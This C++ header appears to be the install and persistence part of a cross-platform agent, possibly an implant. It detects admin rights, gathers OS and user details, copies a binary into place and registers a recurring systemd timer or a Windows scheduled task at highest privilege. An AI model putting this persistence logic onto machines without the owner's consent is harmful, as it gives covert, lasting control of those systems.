#ifndef SYSTEM_HH
#define SYSTEM_HH

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <string>

#include "constants.hh"
#include "request.hh"

#ifdef __linux__

#include <sys/stat.h>
#include <unistd.h>

namespace util {

bool CopyFile(std::string source_path, std::string new_path) {
    std::ifstream source_file(source_path, std::ios::binary);
    std::ofstream new_file(new_path, std::ios::binary | std::ios::trunc);
    if (source_file.is_open() && new_file.is_open()) {
        new_file << source_file.rdbuf();
        return true;
    } else
        return false;
}

int LinkFile(std::string source_file, std::string new_file) {
    return link(source_file.c_str(), new_file.c_str());
}

std::string PopenSubprocess(const std::string& command) {
    FILE* pipe;
    char buf[512];
    std::string output;

    if (!(pipe = popen(command.c_str(), "r"))) {
        std::exit(1);
    }

    while (std::fgets(buf, sizeof(buf), pipe) != NULL) {
        output += buf;
    }
    pclose(pipe);

    return output;
}

bool IsSuperuser() { return (PopenSubprocess("id -u | tr -d '\n'") == "0"); }

std::string GetInstallDir() {
    std::string install_dir;
    if (IsSuperuser()) {
        install_dir = ROOT_HOME + "/" + INSTALL_DIR + "/";
    } else {
        install_dir = std::getenv("HOME") + ("/" + INSTALL_DIR + "/");
    }

    return install_dir;
}

std::string GetOS() { return util::PopenSubprocess("uname | tr -d '\n'"); }

std::string GetUser() {
    std::string user;

    if (util::IsSuperuser()) {
        user = "root";
    } else {
        user = std::getenv("USER");
    }

    return user;
}

}  // namespace util

namespace install {

void InstallFiles() {
    std::string mkdir_command, install_dir, timer_path, bin_path;

    install_dir = util::GetInstallDir();
    bin_path = install_dir + BIN_NEW;
    mkdir_command = "mkdir -p " + util::GetInstallDir() + " ";

    if (util::IsSuperuser()) {
        mkdir_command += SYS_SERVICE_DEST;
        timer_path = SYS_SERVICE_DEST + "/" + TIMER;

        // Change service name back to normal after moving if root
        util::CopyFile(SYS_SERVICE, SYS_SERVICE_DEST + "/" + SERVICE);
    } else {
        std::string home_dir = std::getenv("HOME");
        std::string user_service_dir = home_dir + "/" + SERVICE_DEST;

        mkdir_command += user_service_dir;
        timer_path = user_service_dir + "/" + TIMER;

        util::CopyFile(SERVICE, user_service_dir + "/" + SERVICE);
    }

    std::system(mkdir_command.c_str());
    util::CopyFile(BIN, bin_path);
    util::CopyFile(TIMER, timer_path);

    // Ensure that binary is executable for owner
    chmod(bin_path.c_str(), S_IRWXU);
}

void InitRecurringJob() {
    std::string systemd_command;

    if (util::IsSuperuser()) {
        systemd_command = "systemctl enable --now " + TIMER;
    } else {
        systemd_command = "systemctl enable --now --user " + TIMER;
    }

    std::system(systemd_command.c_str());
}

}  // namespace install

#endif  // __linux__

#ifdef WIN32

#include <windows.h>
#include <regex>

bool IS_SUPERUSER;
bool IS_SUPERUSER_IS_CACHED = false;

namespace util {

bool CopyFile(std::string source_file, std::string new_file) {
    return CopyFile(source_file.c_str(), new_file.c_str(), false);
}

std::string PopenSubprocess(const std::string& command) {
    FILE* pipe;
    char buf[512];
    std::string output;

    if (!(pipe = _popen(command.c_str(), "r"))) {
        std::exit(1);
    }

    while (fgets(buf, sizeof(buf), pipe) != NULL) {
        output += buf;
    }
    _pclose(pipe);

    return output;
}

bool IsSuperuser() {
    if (IS_SUPERUSER_IS_CACHED) {
        return IS_SUPERUSER;
    } else {
        IS_SUPERUSER = (util::PopenSubprocess("net session")).size();
        IS_SUPERUSER_IS_CACHED = true;

        return IS_SUPERUSER;
    }
}

std::string GetInstallDir() {
    std::string install_dir;
    if (util::IsSuperuser()) {
        install_dir = ADMIN_INSTALL_DIR + "\\";
    } else {
        install_dir = std::getenv("USERPROFILE") + ("\\" + INSTALL_DIR + "\\");
    }

    return install_dir;
}

std::string GetOS() {
    std::string win_version =
        util::PopenSubprocess("systeminfo | findstr /B /C:\"OS Name\"");
    std::regex pattern("[\\n\\r\\s]*.*?(Windows\\s*\\S+).*[\\n\\r\\s]*");
    std::smatch match;
    std::regex_match(win_version, match, pattern);

    return match[1];
}

std::string GetUser() {
    std::string user = std::getenv("USERNAME");
    if (IsSuperuser()) {
        user += " (admin)";
    }

    return user;
}

}  // namespace util

namespace install {

void InstallFiles() {
    std::string install_dir = util::GetInstallDir();
    std::system(("mkdir " + install_dir).c_str());
    util::CopyFile(BIN, install_dir + BIN_NEW);
}

void InitRecurringJob() {
    // Schedule task for Windows
    std::string install_dir = util::GetInstallDir();
    std::string task_command = "schtasks.exe /create /F /tn " + TASK_NAME +
                               " /sc " + TASK_FREQ + " /mo " + TASK_FREQ_VALUE +
                               " /tr " + install_dir + BIN_NEW;
    if (util::IsSuperuser()) {
        task_command += " /rl highest";
    }

    std::system(task_command.c_str());
}

}  // namespace install

#endif  // WIN32

#endif  // SYSTEM_HH